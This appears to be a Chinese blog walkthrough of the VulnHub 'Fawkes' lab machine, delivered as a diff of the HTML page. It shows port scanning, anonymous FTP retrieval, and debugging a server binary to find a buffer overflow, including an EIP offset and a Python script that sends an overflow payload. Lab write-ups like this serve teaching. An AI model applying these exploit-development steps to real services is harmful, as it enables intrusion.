@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶机：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;harrypotter&#x2F;Fawkes.ova 难度：高 目标：取得 2 root 权限 + 3 Flag 备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub-12-Fawkes">
+<meta property="og:url" content="http://byesec.com/posts/66759de7.html">
+<meta property="og:site_name" content="patrik&#39;s blog">
+<meta property="og:description" content="靶机：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;harrypotter&#x2F;Fawkes.ova 难度：高 目标：取得 2 root 权限 + 3 Flag 备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707113714025.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707113737579.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114104530.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114714335.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114336330.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114913103.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707115903746.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707115925373.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120324816.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120037025.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120633569.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120900363.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707140210423.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707140708821.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141102982.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141204237.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141603903.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707142204812.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707142434132.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143009913.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143130756.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143413107.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143529386.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707145119600.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150157494.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150247444.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150357550.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708095639705.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100346146.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100359365.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100827186.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100952711.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708101042151.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708102335787.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708134444432.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708103645058.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708134340029.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708135140397.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140004644.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708135930211.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140701588.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140736841.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140828290.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140941575.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708141143890.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708141641296.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142113110.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142325997.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142720991.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142645756.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708143146037.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708144317862.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708144652783.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708145500413.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220714144431446.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176484-dfa334ed-fe19-4f3a-be79-cf78c16bffd4.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176472-335a6e92-80e3-4a0c-904a-2f6efc0c9235.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176496-6f84835e-2a20-4236-af70-22b573b685fe.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176637-be6fd5c7-5de9-4617-877e-ca6f7f07caee.png">
+<meta property="article:published_time" content="2022-08-28T04:10:55.000Z">
+<meta property="article:modified_time" content="2022-09-14T01:49:07.325Z">
+<meta property="article:author" content="patrik">
+<meta property="article:tag" content="靶机🎯">
+<meta property="article:tag" content="VulnHub🎯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707113714025.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=48">
+          
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnHub-12-Fawkes</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="patrik&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/fd146a69.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/db530782.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/66759de7.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/66759de7.html&text=VulnHub-12-Fawkes"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/66759de7.html&is_video=false&description=VulnHub-12-Fawkes"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnHub-12-Fawkes&body=Check out this article: http://byesec.com/posts/66759de7.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/66759de7.html&name=VulnHub-12-Fawkes&description=&lt;blockquote&gt;
+&lt;p&gt;靶机：&lt;a href=&#34;https://download.vulnhub.com/harrypotter/Fawkes.ova&#34;&gt;https://download.vulnhub.com/harrypotter/Fawkes.ova&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;难度：高&lt;/p&gt;
+&lt;p&gt;目标：取得 2 root 权限 + 3 Flag&lt;/p&gt;
+&lt;p&gt;备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/66759de7.html&t=VulnHub-12-Fawkes"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">服务探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.1.</span> <span class="toc-text">21端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#22%E5%92%8C2222%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text">22和2222端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.3.</span> <span class="toc-text">访问80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE9898%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.4.</span> <span class="toc-text">访问9898端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-number">4.</span> <span class="toc-text">ftp匿名登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">程序调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">缓冲区溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E6%98%8E%E6%96%87%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">ftp明文流量分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-number">8.1.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9exp"><span class="toc-number">8.2.</span> <span class="toc-text">修改exp</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnHub-12-Fawkes
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">干 脆 面</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-28T04:10:55.000Z" class="dt-published" itemprop="datePublished">2022-08-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8%F0%9F%94%90/">安全🔐</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VulnHub%F0%9F%8E%AF/" rel="tag">VulnHub🎯</a>, <a class="p-category" href="/tags/%E9%9D%B6%E6%9C%BA%F0%9F%8E%AF/" rel="tag">靶机🎯</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/harrypotter/Fawkes.ova">https://download.vulnhub.com/harrypotter/Fawkes.ova</a></p>
+<p>难度：高</p>
+<p>目标：取得 2 root 权限 + 3 Flag</p>
+<p>备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707113714025.png" alt="image-20220707113714025"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.1.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707113737579.png" alt="image-20220707113737579"></p>
+<h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p21,22,80,2222,9898 -sV -sC 192.168.1.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114104530.png" alt="image-20220707114104530"></p>
+<h4 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114714335.png" alt="image-20220707114714335"></p>
+<p>通过返回的信息可知允许匿名登录，以及存在server_hogwarts文件。</p>
+<p>尝试搜索是否存在针对该版本的已有可利用漏洞</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114336330.png" alt="image-20220707114336330"></p>
+<p>发现该漏洞为远程拒绝服务，并不能有效帮助得到权限，不考虑</p>
+<h4 id="22和2222端口"><a href="#22和2222端口" class="headerlink" title="22和2222端口"></a>22和2222端口</h4><p>❓:发现目标开放的两个不同端口并安装了不同的OpenSSH本</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114913103.png" alt="image-20220707114913103"></p>
+<h4 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h4><p>访问后并未发现有效信息</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707115903746.png" alt="image-20220707115903746"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707115925373.png" alt="image-20220707115925373"></p>
+<p>进行目录扫描</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120324816.png" alt="image-20220707120324816"></p>
+<h4 id="访问9898端口"><a href="#访问9898端口" class="headerlink" title="访问9898端口"></a>访问9898端口</h4><p>nmap未能识别出9898端口开放的服务 但是发现了一些指纹信息 其内容主要为关于电影的一些词语</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120037025.png" alt="image-20220707120037025"></p>
+<h3 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h3><p>登陆后将该文件下载到本地，尝试看能否跳出当前目录未能如愿</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120633569.png" alt="image-20220707120633569"></p>
+<p>该文件为32位的ELF可执行程序</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120900363.png" alt="image-20220707120900363"></p>
+<p>在本地执行该程序（因为arm架构无法运行故下面切换windows设备进行实验），并检查是否新增了相关的进程</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707140210423.png" alt="image-20220707140210423"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707140708821.png" alt="image-20220707140708821"></p>
+<p>发现伴随执行后产生的进程 也开放了9898端口 联想到之前扫描目标端口开放情况时也开放的9898端口</p>
+<p>比较一下本机和目标上的9898端口上跑的程序是否相同</p>
+<p>本机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 9898</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141102982.png" alt="image-20220707141102982"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.101 9898</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141204237.png" alt="image-20220707141204237"></p>
+<p>比较结果：目标服务器上9898端口允许的服务应该就是server_hogwarts文件</p>
+<h3 id="程序调试分析"><a href="#程序调试分析" class="headerlink" title="程序调试分析"></a>程序调试分析</h3><p>目的是想要测试该程序是否存在缓冲区溢出等漏洞</p>
+<p>首先要关闭kali上的安全设置ALSR（避免内存地址改变，对分析过程造成干扰）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141603903.png" alt="image-20220707141603903"></p>
+<p>安装edb-debugger</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install edb-debugger</span><br></pre></td></tr></table></figure>
+
+<p>打开server_hogwarts</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707142204812.png" alt="image-20220707142204812"></p>
+<p>点击run 使用该调试器连接该文件</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707142434132.png" alt="image-20220707142434132"></p>
+<p>本地再使用nc连接该程序</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143009913.png" alt="image-20220707143009913"></p>
+<p>使用python生成500个A 并写入程序可输入点执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print(&#x27;A&#x27;*500)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143130756.png" alt="image-20220707143130756"></p>
+<p>执行后调试工具直接报错 EIP（EIP 寄存器存放 下一个CPU指令存放的内存地址 ，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行）已经被覆盖到0x41414141 （ascii(41)&#x3D;A）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143413107.png" alt="image-20220707143413107"></p>
+<p>点击ok继续</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143529386.png" alt="image-20220707143529386"></p>
+<p>发现ESP寄存器（ESP 寄存器存放当前线程的栈顶指针（数据））内也被覆盖，报错的情况也说明了该程序确实没有对输入的数据长度进行合理的限制，基本上也确定是存在缓冲区溢出漏洞的</p>
+<h3 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h3><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>生成500个不重复的字节 重新启动程序、连接调试器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 500</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707145119600.png" alt="image-20220707145119600"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150157494.png" alt="image-20220707150157494"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150247444.png" alt="image-20220707150247444"></p>
+<p>计算偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -l 500 -q 64413764</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150357550.png" alt="image-20220707150357550"></p>
+<p>确定了偏移量为112 后写一个python小脚本 测试112位后能否被写入到EIP寄存器内</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;B&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;C&#x27;</span>*<span class="number">32</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>重新启动程序、连接调试器后执行脚本</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708095639705.png" alt="image-20220708095639705"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100346146.png" alt="image-20220708100346146"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100359365.png" alt="image-20220708100359365"></p>
